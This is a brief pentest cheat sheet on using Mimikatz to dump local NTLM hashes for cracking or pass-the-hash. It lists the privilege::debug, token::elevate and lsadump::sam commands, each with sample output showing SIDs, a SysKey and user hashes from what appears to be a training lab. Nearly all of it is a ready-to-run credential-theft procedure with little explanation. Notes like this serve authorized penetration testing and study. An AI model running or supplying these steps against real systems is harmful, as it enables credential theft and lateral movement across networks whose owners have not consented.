# mimikatz
Full breakdown available here: [Mimikatz](https://tools.thehacker.recipes/mimikatz)

Rudimentary setup for dumping NTLM hashes for cracking or pass-the-hash attacks.

To use *sekurlsa::logonpasswords* or *lsadump::sam* we need **SeDebugPrivilege** use this to enable it. So at the `mimikatz #` console use the following.

This sets the debug privilege.

```console
privilege::debug
```
Success looks like:
```console
Privilege '20' OK
```

This tells mimikatz to use a token that impersonates another entity and by default it's `SYSTEM` thus `NT AUTHORITY\SYSTEM`.
```console
token::elevate
```
Success looks like:
```console
SID name  : NT AUTHORITY\SYSTEM

656     {0;000003e7} 1 D 34811          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;000413a0} 1 F 6146616     MARKETINGWK01\offsec    S-1-5-21-4264639230-2296035194-3358247000-1001  (14g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 6217216     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
```

If the previous two were successfull, now we can get NTLM hashes for users with this.

```console
lsadump::sam
```
Success looks like:
```console
Domain : MARKETINGWK01
SysKey : 2a0e15573f9ce6cdd6a1c62d222035d5
Local SID : S-1-5-21-4264639230-2296035194-3358247000
 
RID  : 000003e9 (1001)
User : offsec
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
 
RID  : 000003ea (1002)
User : nelly
  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
...
```
